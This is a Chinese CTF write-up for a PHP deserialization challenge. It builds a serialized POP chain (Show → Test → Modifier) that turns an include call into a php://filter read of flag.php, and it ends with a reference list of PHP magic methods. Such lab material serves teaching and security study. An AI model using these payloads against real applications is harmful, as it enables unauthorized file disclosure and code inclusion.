题解

进入题目页给出代码：

Welcome to index.php
<?php
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}

通过pop传参读取flag.php文件,在Modifier类中，存在任意文件包含include关键字，所以首先就是构造Modifier对象序列化字符串，然后就需要其他的来触发这个__invoke()，即将对象当作函数调用时触发。

继续看下面两个类：Show和Test。

在Show类中，存在两个属性source和str，三个魔术方法：

  • __construct():在使用new创建一个类对象的实例时，会被自动调用。通常用来给对象的属性赋初始值，相当于构造函数。这里是给新对象的source属性赋值。
  • __toString():当对象被当作字符串时自动调用。必须返回字符串，否则报错。这里返回对象的str属性的source属性。
  • __wakeup()：序列化字符串在反序列化完成后会被自动调用。这里存在一个正则表达式preg_match()判断该对象的source匹配第一参数内容。

在Test类中，一属性p两魔术方法__construct()和__get()

  • _get():读取不可访问或未定义的属性时触发。这里使得$function赋值为对象的p属性，然后将其$function()当作函数调用

结合以上，怎么触发__invoke()？我们需要将对象当作函数调用，所以最内层应该是：

O:8:"Modifier":1:{s:3:"var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}

上下文唯一一处将对象当作函数调用是_get()方法，赋值Test对象属性p为Modifier对象，所以第二层：

O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:3:"var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}

考虑如何触发__get()方法，即在读取不可访问或未定义的属性时触发，总观下来即触发__toString()方法，其中返回对象的str属性的source属性，使source不可访问即可。而Show对象的source这里不需要可以设置为N，所以第三层：

O:4:"Show":2:{s:6:"source";N;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:3:"var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}

回到最初，pop总归会触发__wakeup()方法，正则表达式preg_match将第二参数也就是对象的source属性当作字符串处理触发toString()，构成完整pop链。这一层的Show对象不需要str属性，设置为N。按照PHP序列化的语法，对象内的属性赋值结束后，不需要在对象的闭合大括号PHP后面再加分号。所以最后一层：

O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:3:"var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}s:3:"str";N;}

忘记了一个细节问题：Modifier类中的var属性是protected类型,在序列化时必须是空字节*空字节属性名格式。

两种解决方法：

  • 把以下payload进行URL编码，然后在*左右添加%00。
  • 使用PHP脚本构造序列化。

第一个方法：

这里的Modifier对象属性var必须是六个字符符合空字节*空字节var格式。URL编码后添加%00。

拓展和知识点总结

魔术方法总结

PHP中的魔术方法是指以双下划线__开头的特殊方法，它们在特定事件发生时自动被调用。合理使用魔术方法能实现属性重载、方法重载、序列化控制等高级特性，但需要注意他们通常会有轻微的性能开销。

__construct()，类的构造函数

PHP中构造方法是对象创建完成后第一个被自动调用的方法。在每个类中都有一个构造方法，如果没有显式地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。

通常构造方法被用来执行一些有用初始化任务，如对成员属性在创建对象时赋予初始值。

__destruct()，类的析构函数

析构方法允许在销毁一个类之前执行的一些操作或完成一些功能，比如文件关闭、释放结果集等等。

析构方法是PHP5才引进的新内容。

一般来说，析构方法在PHP中并不是很常用，它属类中可选择的一部分，通常用来完成一些在对象销毁前的清理任务。

__call()，在对象调用一个不可访问方法时调用

该方法有两个参数，第一个参数$function_name会自动接收不存在的方法名，第二个$arguments则以数组的方式接受不存在方法的多个参数。

__call()的作用是为了避免当调用的方法不存在时产生错误，而意外的导致程序中止。该方法在调用的方法不存在时会自动调用，程序仍然会继续执行下去。

__callStatic()，用静态方式中调用一个不可访问方法时调用

此方法与上述方法__call()功能除了__callStatic()是静态方法准备的之外其他都是一样的。

__get()，获得一个类的成员变量时调用

在PHP面向对象编程中，类的成员属性被设定为private后，如果我们试图在外面调用它则会出现“不能访问某个私有属性”的错误，那么为了解决这个问题，可以使用魔术方法__get()。

__get()的作用是在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值。

__set()，设置一个类的成员变量时调用

__set($property,$value)方法的作用是以此来设置私有属性，给一个未定义的属性赋值时，此方法会被触发，传递的参数是被设置的属性名和值。

__isset()，当对不可访问属性调用isset()或empty()时调用

先引入isset()函数，用于检测变量是否已被设定，传入一个变量作为参数，如果传入的变量存在则传回true，否则传回false。

如果在一个对象外面使用isset()这个函数去测定对象内的成员是否被设定可不可以使用它呢？

分两种情况，如果对象内成员变量是公有的，就可以使用这个函数来测定成员属性。如果是私有的成员属性就不行了。所以出现了__isset()方法，把它添加在类中，当在类外部使用isset()函数来测定对象里面的私有成员变量是否被设定时，就会自动调用类里面的__isset()方法。

__unset()，当对不可访问属性调用unset()时被调用

也先引入unset()函数，这个函数的作用是删除指定的变量且传回true，参数为要删除的变量。

那么如果在一个对象外部去删除对象内部的成员属性用unset()函数可以吗？同上，如果对象里的成员属性是公有的，就可以使用这个函数在对象外面呢删除对象的共有属性，如果是私有的使用这个函数就没有权限删除。

在对象内加上__unset()方法，就可以在对象的外部去删除对象的私有成员属性了。加上后在对象外部使用unset()函数删除对象内部的私用成员属性时对象会自动调用__unset()函数来帮我们删除对象内的私有成员属性。

__sleep()，执行serialize()时，先会调用这个函数

serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，则该方法会优先被调用，然后再执行序列化操作。

此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称和数组。

如果该方法未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误。

__sleep()不能返回父类的私有成员的名字。这样做会产生一个E_NOTICE级别的错误。可以用Serializable接口来替代。

__sleep()方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。

__wakeup()，执行unserialize()`时，会先调用这个函数

如果说__sleep()是白的，那么__wakeup()就是黑的了。

unserialize()会检查是否存在一个__wakeup()方法。入伙存在，则会先调用__wakeup()方法，预先准备对象需要的资源。

__wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其他的初始化操作。

__toString()，类被当作字符串时的回应方法

__toString()方法常用于一个类被当成字符串时应该怎样回应，例如echo $obj;应该显示什么。

注意：此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR级别的致命错误。

警告：不能在__toString()方法中抛出异常，这么做会导致致命错误。

__invoke()，调用函数的方式调用一个对象时的回应方法

当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用。

本特性只会在PHP5.3.0版本及以上有效。

__set_state()，调用var_export()导出类时，此静态方法会被调用

作用：自PHP5.1.0起，当调用var_export()导出类时，此静态方法会被自动调用。

本方法的唯一参数是一个数组，其中包含array('property' => value,...)格式排列的类属性。

__clone()，当对象复制完成时调用

在多数情况下，我们并不需要完全复制一个对象来获得其中属性。但有一个情况下确实需要：如果有一个GTK窗口对象，该对象持有窗口相关的资源。你就可能会想复制一个新的窗口，保持所有属性与原来窗口相同，但必须是一个新的对象(若果不是新的对象，那么一个窗口中的改变就会影响所有窗口)。

还有一种情况：如果对象A中保存着对象B的引用，当你复制对象A时，你想使用的对象不再是B而是B的副本，那么必须得到对象A的一个副本。

对象复制可以使用clone关键字来完成(如果可能，这将调用对象的__clone()方法)。对象中的__clone()方法不能直接调用。

__autoload(),尝试加载未定义的类

可以通过定义这个函数来启用类的自动加载。

用于自动加载类。已废弃，现代 PHP 推荐使用 spl_autoload_register()。

在此方法出现之前，若要在一个程序文件中实例化100个对象，那么必须用include或require包含进来100个类文件，或者你把这100个类定义在同一个类文件中。

所以出现此方法，会在实例化对象之前自动加载制定的文件。

__debugInfo(),打印所需调试信息

该方法在PHP5.6.0版本及其以上才可以使用。
